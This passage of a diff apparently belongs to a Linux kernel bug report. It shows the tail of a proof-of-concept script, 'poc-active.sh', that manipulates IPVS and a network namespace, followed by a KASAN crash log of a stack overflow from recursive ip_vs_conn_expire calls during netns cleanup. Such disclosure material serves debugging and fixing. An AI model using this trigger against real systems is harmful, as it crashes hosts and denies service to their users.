+    print("IPVS flush returned", flush=True)
+    while True:
+        time.sleep(1)
+elif mode == "exit":
+    print("exiting namespace holder", flush=True)
+    sys.stdout.flush()
+    os._exit(0)
+else:
+    raise SystemExit(f"unknown MODE={mode!r}")
+PY
+------END poc-active.sh--------
+
+----BEGIN crash log----
+[   65.750786] BUG: TASK stack guard page was hit at ffffc900008d7fb8 (stack is ffffc900008d8000..ffffc900008e0000)
+[   65.752171] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
+[   65.752171] CPU: 0 UID: 0 PID: 72 Comm: kworker/u8:1 Not tainted 7.3.0-rc1+ #2 PREEMPT(lazy) 
+[   65.752171] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+[   65.752171] Workqueue: netns cleanup_net
+[   65.752171] RIP: 0010:_raw_spin_lock_irqsave (??:?)
+[   65.752171] Code: 0f 1f 44 00 00 48 b8 00 00 00 00 00 fc ff df 55 48 89 e5 41 55 41 54 49 89 fc 53 48 8d 5d 88 48 c1 eb 03 48 01 d8 48 83 ec 60 <48> c7 45 88 b3 8a b5 41 48 c7 45 90 52 b6 6a 85 48 c7 45 98 e0 f2
+All code
+========
+   0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+   5:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
+   c:	fc ff df 
+   f:	55                   	push   %rbp
+  10:	48 89 e5             	mov    %rsp,%rbp
+  13:	41 55                	push   %r13
+  15:	41 54                	push   %r12
+  17:	49 89 fc             	mov    %rdi,%r12
+  1a:	53                   	push   %rbx
+  1b:	48 8d 5d 88          	lea    -0x78(%rbp),%rbx
+  1f:	48 c1 eb 03          	shr    $0x3,%rbx
+  23:	48 01 d8             	add    %rbx,%rax
+  26:	48 83 ec 60          	sub    $0x60,%rsp
+  2a:*	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)		<-- trapping instruction
+  31:	41 
+  32:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
+  39:	85 
+  3a:	48                   	rex.W
+  3b:	c7                   	.byte 0xc7
+  3c:	45 98                	rex.RB cwtl 
+  3e:	e0 f2                	loopne 0x32
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)
+   7:	41 
+   8:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
+   f:	85 
+  10:	48                   	rex.W
+  11:	c7                   	.byte 0xc7
+  12:	45 98                	rex.RB cwtl 
+  14:	e0 f2                	loopne 0x8
+[   65.752171] RSP: 0018:ffffc900008d7fc0 EFLAGS: 00000286
+[   65.752171] RAX: fffff5200011aff8 RBX: 1ffff9200011aff8 RCX: dffffc0000000000
+[   65.752171] RDX: 1ffffffff0b02a1c RSI: ffffc900008d80c0 RDI: ffff88806ce2f440
+[   65.752171] RBP: ffffc900008d8038 R08: 1ffff11002d4aa47 R09: ffffed1002d4aa48
+[   65.752171] R10: ffffed1002d4aa47 R11: ffff888016a5523b R12: ffff88806ce2f440
+[   65.752171] R13: ffff888016a552c0 R14: ffffed1002d4aa5c R15: 0000000000001280
+[   65.752171] FS:  0000000000000000(0000) GS:ffff8880e57b9000(0000) knlGS:0000000000000000
+[   65.752171] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   65.752171] CR2: ffffc900008d7fb8 CR3: 0000000005aa8000 CR4: 00000000000006f0
+[   65.752171] Call Trace:
+[   65.752171]  <TASK>
+[   65.752171]  ? lock_timer_base (timer.c:?)
+[   65.752171]  ? timer_delete (??:?)
+[   65.752171]  ? __pfx_timer_delete (??:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
+[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? update_se (fair.c:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? pick_task_fair (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? preempt_schedule (??:?)
+[   67.728355]  ? preempt_schedule_thunk (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.308238]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.308238]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.308238]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.308238]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.308238]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.308238]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.308238]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? update_stack_state (unwind_frame.c:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? fib6_del (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? read_hpet (hpet.c:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? _raw_spin_trylock (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? stack_trace_save (??:?)
+[   68.763958]  ? ftrace_graph_ret_addr (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? update_stack_state (unwind_frame.c:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
+[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
+[   68.763958]  ? ip_vs_conn_del (ip_vs_conn.c:?)
+[   68.763958]  ? ip_vs_conn_net_cleanup (??:?)
